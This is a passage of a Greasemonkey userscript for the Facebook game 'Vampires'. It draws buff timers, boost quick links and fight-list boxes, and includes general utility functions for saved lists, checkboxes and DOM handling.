	var activeMagicBoxDSDiv = document.getElementById('activeMagicBoxDSDiv');
	if (!activeMagicBoxDSDiv) {
		var activeMagicBoxDSDiv = makeElement("div", activeMagicBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+108)+"px; top: "+(18)+"px; font-size: 8pt; color: "+(isGMEqual ('activeMagicDSon', 'true') ? "#58FA58" : "#888888" )+";"});
    		activeMagicBoxDSDiv.id = 'activeMagicBoxDSDiv';
	}
	activeMagicBoxDSDiv.innerHTML  = "DS "+GM_getValue('activeMagicDSStrength', '?')+" ("+(GM_getValue('activeMagicDSExpireTime', 0)-now>0 ? timeLeftHHMM('activeMagicDSExpireTime') : '0:00')+")";
	activeMagicBoxDSDiv.setAttribute("title", "Demonic Strength: "+GM_getValue('activeMagicDSStrength', '?')+" to base damage");

	var activeMagicBoxLKDiv = document.getElementById('activeMagicBoxLKDiv');
	if (!activeMagicBoxLKDiv) {
		var activeMagicBoxLKDiv = makeElement("div", activeMagicBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+108)+"px; top: "+(33)+"px; font-size: 8pt; color: "+(isGMEqual ('activeMagicLKon', 'true') ? "#58FA58" : "#888888" )+";"});
    		activeMagicBoxLKDiv.id = 'activeMagicBoxLKDiv';
	}
	activeMagicBoxLKDiv.innerHTML  = "LK "+GM_getValue('activeMagicLKStrength', '?')+" ("+(GM_getValue('activeMagicLKExpireTime', 0)-now>0 ? timeLeftHHMM('activeMagicLKExpireTime') : '0:00')+")";
	activeMagicBoxLKDiv.setAttribute("title", "Lilith's Kiss: +"+GM_getValue('activeMagicLKStrength', '?')+" chance of rare loot from missions");

	var activeMagicBoxGWDiv = document.getElementById('activeMagicBoxGWDiv');
	if (!activeMagicBoxGWDiv) {
		var activeMagicBoxGWDiv = makeElement("div", activeMagicBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+108)+"px; top: "+(48)+"px; font-size: 8pt; color: "+(isGMEqual ('activeMagicGWon', 'true') ? "#58FA58" : "#888888" )+";"});
    		activeMagicBoxGWDiv.id = 'activeMagicBoxGWDiv';
	}
	activeMagicBoxGWDiv.innerHTML  = "GW "+GM_getValue('activeMagicGWStrength', '?')+" ("+(GM_getValue('activeMagicGWExpireTime', 0)-now>0 ? timeLeftHHMM('activeMagicGWExpireTime') : '0:00')+")";
	activeMagicBoxGWDiv.setAttribute("title", "Glyph of Wisdom: +"+GM_getValue('activeMagicGWStrength', '?')+" XP from missions");

	return true;
}


function refreshQuickLinksBox(){

	quickLinksBox.innerHTML = "Quick Links<br>\
		<a href='http://facebook6.vampires.zynga.com/stats.php?useBoostCons=251' onclick='return do_ajax(\"mainDiv\", \"stats.php?useBoostCons=251\");' style='color:#5858FA'>50% Rage Boost</a> ("+GM_getValue('numRageBoosts', '?')+")&nbsp;&nbsp;&nbsp;&nbsp;\
		<a href='http://facebook6.vampires.zynga.com/stats.php?useBoostCons=249' onclick='return do_ajax(\"mainDiv\", \"stats.php?useBoostCons=249\");' style='color:#5858FA'>50% Energy Boost</a> ("+GM_getValue('numFiftyNrgBoosts', '?')+")<br>\
		<a href='http://facebook6.vampires.zynga.com/stats.php?useBoostCons=252' onclick='return do_ajax(\"mainDiv\", \"stats.php?useBoostCons=252\");' style='color:#5858FA'>50% Health Boost</a> ("+GM_getValue('numHealthBoosts', '?')+")&nbsp;&nbsp;&nbsp;&nbsp;\
		<a href='http://facebook6.vampires.zynga.com/stats.php?useBoostCons=254' onclick='return do_ajax(\"mainDiv\", \"stats.php?useBoostCons=254\");' style='color:#5858FA'>100% Energy Boost</a> ("+GM_getValue('numHundredNrgBoosts', '?')+")<br><div style='font-size:0;height:8px;'></div>\
		<a href='http://apps.facebook.com/vampiresgame/stats.php' onclick='return do_ajax(\"mainDiv\", \"stats.php\");' style='color:#5858FA'>Stats</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href='http://apps.facebook.com/vampiresgame/comments.php' onclick='return do_ajax(\"mainDiv\", \"comments.php\");' style='color:#5858FA'>Comments</a>";
	return true;
}


function ignoreElement(element){
	if(element.id=='')
		return true;
 	if (element.id.indexOf('mainDiv') != -1
	|| element.id.indexOf('tab_handle') != -1)
		return false;
	return true;
}

function CycleFightList(){
	  // Move the first item to the end of the list.
	var opponents = GM_getValue('fightList', '').split("\n");
	var first = opponents.shift();
	if (first) {
		opponents.push(first);
	}
	GM_setValue('fightList', opponents.join('\n'));
}


function clearLog(){
    GM_setValue('itemLog', '');
    vwapLogBox.innerHTML = "";
    alert('Log Cleared');
}

function toggleLogBox(){
    if(logOpen == false){
        logOpen = true;
        viewLogButton.innerHTML = "Hide Log";
        vwapLogBox.style.visibility = "visible";
    }
    else{
        logOpen = false;
        viewLogButton.innerHTML = "View Log";
        vwapLogBox.style.visibility = "hidden";
    }
}





function clearLostList(){
	var autoFightLossList = new Array();
	setSavedList('autoFightLossList', autoFightLossList);
	fightLossesBox.innerHTML = "Fights Lost:<br>"+GM_getValue('autoFightLossList');
	var clearLostListButton = makeElement('div', fightLossesBox,{'style':'position: absolute; left:140px; top: 5px; color:red; font-size: 8pt; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;'});
        	clearLostListButton.innerHTML  = "Clear";
        	clearLostListButton.addEventListener('click', clearLostList, false);
    }



function clearArenaLostList(){
	var autoFightArenaLossList = new Array();
	setSavedList('autoFightArenaLossList', autoFightArenaLossList);
	fightArenaLossesBox.innerHTML = "Arena Fights Lost:<br>"+GM_getValue('autoFightArenaLossList');
	var clearArenaLostListButton = makeElement('div', fightArenaLossesBox,{'style':'position: absolute; left:140px; top: 5px; color:red; font-size: 8pt; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;'});
        	clearArenaLostListButton.innerHTML  = "Clear";
        	clearArenaLostListButton.addEventListener('click', clearArenaLostList, false);
    }


function clearGoodTargetsList(){
	var autoFightGoodTargetsList = new Array();
	setSavedList('autoFightGoodTargetsList', autoFightGoodTargetsList);
	fightGoodTargetsBox.innerHTML = "Good Targets:<br>"+GM_getValue('autoFightGoodTargetsList');
	var clearGoodTargetsListButton = makeElement('div', fightGoodTargetsBox,{'style':'position: absolute; left:140px; top: 5px; color:red; font-size: 8pt; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;'});
	        clearGoodTargetsListButton.innerHTML  = "Clear";
	        clearGoodTargetsListButton.addEventListener('click', clearGoodTargetsList, false);
    }






function makeElement(type, appendto, attributes, checked, chkdefault) {
  var element = document.createElement(type);
  if (attributes != null) {
    for (var i in attributes) {
      element.setAttribute(i, attributes[i]);
    }
  }
  if (checked != null) {
    if (GM_getValue(checked, chkdefault) == 'checked') {
      element.setAttribute('checked', 'checked');
    }
  }
  if (appendto) {
    appendto.appendChild(element);
  }
  return element;
}

function createXMLHTTPObject() {
    var xmlhttp = false;
    for (var i=0;i<XMLHttpFactories.length;i++) {
        try {
            xmlhttp = XMLHttpFactories[i]();
        }
        catch (e) {
            continue;
        }
        break;
    }
    return xmlhttp;
}


// General and Array methods from MWAP v1.1.25 build 362
///////////////////////////////////////////////////////////////////////////////
//                           UTILITY METHODS                                 //
///////////////////////////////////////////////////////////////////////////////


/******************************** General ********************************/

function clearSettings() {
  if (typeof GM_listValues == 'function' &&
      typeof GM_deleteValue == 'function') {
    var values = GM_listValues();
    for (var i in values) {
      if (typeof GM_deleteValue == 'function')
        GM_deleteValue(values[i]);
    }
  } else {
    alert('In order to do this you need at least GreaseMonkey version: 0.8.20090123.1. Please upgrade and try again.');
  }
}

/******************************** Array ********************************/

function getArrayDiffs(workingArray) {
  diffArray = [];
  for (var i = 1; i < workingArray.length; i++) {
    if (workingArray[i] - workingArray[i-1] < 0) {
      diffArray.push(0)
    } else {
      diffArray.push(workingArray[i] - workingArray[i-1]);
    }
  }
  diffArray.unshift(0);
  return diffArray;
}

// Save an array of strings. The strings must not contain "\n".
function setSavedList(listName, list) {
  GM_setValue(listName, list.join('\n'));
}

// Get an array of strings that was saved with setSavedList().
function getSavedList(listName) {
  var savedList = GM_getValue(listName, '');
  return savedList? savedList.split('\n') : [];
}

// Add an item to a list saved with setSavedList().
// If the size of the list is greater than the "max"
// parameter, the first item in the list is removed.
function addSavedListItem(listName, item, max) {
  var savedList = getSavedList(listName);

  // Only add if it isn't already there.
  if (savedList.indexOf(item) != -1) {
    return;
  }

//  addToLog('savedList (before)='+savedList);
//  addToLog(listName+' (before)='+getSavedList(listName));

  savedList.push(item);
//  addToLog('addSavedListItem: added '+item+' to '+listName);
  if (max > 0) {
    while (max < savedList.length) {
      var itm = savedList.shift();
      log('Removing ' + itm + ' from ' + listName + '.');
//  addToLog('Removing ' + itm + ' from ' + listName);
    }
  }
  setSavedList(listName, savedList);
//  addToLog('savedList (after)='+savedList);
//  addToLog(listName+' (after)='+getSavedList(listName));
  return;
}


// This function is intended to create a FIFO list, adding to the beginning with unshift, and removing from the end with pop
// Add an item to a list saved with setSavedList().
// If the size of the list is greater than the "max"
// parameter, the last item in the list is removed.
function addSavedListItemFIFOUnlimited(listName, item, max) {
  var savedList = getSavedList(listName);

  savedList.unshift(item);
  if (max > 0) {
    while (max < savedList.length) {
      var itm = savedList.pop();
      log('Removing ' + itm + ' from ' + listName + '.');
    }
  }
  setSavedList(listName, savedList);
}




// Remove an item from a list saved with setSavedList().
function removeSavedListItem(listName, item) {
  var savedList = getSavedList(listName);
  var idx = savedList.indexOf(item);
  if (idx != -1) {
    savedList.splice(idx, 1);
    setSavedList(listName, savedList);
    return true;
  }
  // No matches.
  return false;
}

function removeJobForItem(jobList, itemName){
  var jobs = getSavedList(jobList, '');
  var i=0;
  if (jobs.length>0){
    var job=jobs[jobs.length-1];
    requirementJob.forEach(
     function(j){
       if (j[1] == job) {
         if (requirementJob[i][0]==itemName) {
           removeSavedListItem(jobList,requirementJob[i][1]);
           log('removing job'+requirementJob[i][1]);
         }
       }
       i++;
     }
    );
  }
}

function cycleSavedList(listName) {
  // Move the first item to the end of the list.
  var opponents = GM_getValue(listName, '').split('\n');
  var first = opponents.shift();
  if (first) {
    opponents.push(first);
  }
  GM_setValue(listName, opponents.join('\n'));
}

/******************************** HTML/DOM ********************************/

// Save an array of checkbox elements
function saveCheckBoxElementArray(arrayEltIds) {
  for (var i=0; i<arrayEltIds.length; i++)
    saveCheckBoxElement(arrayEltIds[i])
}

// Save checkbox element and return true if it is checked
function saveCheckBoxElement(eltId) {
  if (document.getElementById(eltId).checked === true) {
    GM_setValue(eltId, 'checked');
    return true;
  } else {
    GM_setValue(eltId, 0);
    return false;
  }
}

// Check if a GM value is undefined
function isGMUndefined (gmName) {
  return isUndefined (GM_getValue(gmName));
}

// Check if a GM value is the same as the passed value
function isGMEqual (gmName, gmValue) {
  return GM_getValue(gmName) + '' == gmValue + '';
}

// Check if a GM value is checked
function isGMChecked (gmName) {
  return isGMEqual (gmName, 'checked');
}

// Check if a value is undefined
function isUndefined(value) {
  return value + '' == 'undefined';
}


function makeElement(type, appendto, attributes, checked, chkdefault) {
  var element = document.createElement(type);
  if (attributes != null) {
    for (var i in attributes) {
      element.setAttribute(i, attributes[i]);
    }
  }
  if (checked != null) {
    if (GM_getValue(checked, chkdefault) == 'checked') {
      element.setAttribute('checked', 'checked');
    }
  }
  if (appendto) {
    appendto.appendChild(element);
  }
  return element;
}

function destroyByID( id){
  var elt = document.getElementById(id);
  if (elt) elt.parentNode.removeChild(elt);
}

function remakeElement(type, appendto, attributes, checked, chkdefault) {
  if (attributes.id) destroyByID(attributes.id);
  return makeElement(type, appendto, attributes, checked, chkdefault);
}

function xpathFirst(p, c) {
  return document.evaluate(p, c || document, null, XPathResult.ANY_UNORDERED_NODE_TYPE, null).singleNodeValue;
}

function xpath(query, element) {
  var elt = (element == null) ? document : element;
  return document.evaluate(query, elt, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
}

function $x(p, c) {
  var i, r = [], x = document.evaluate(p, c || document, null, XPathResult.UNORDERED_NODE_ITERATOR_TYPE, null);
  while ((i = x.iterateNext())) r.push(i);
  return r;
}
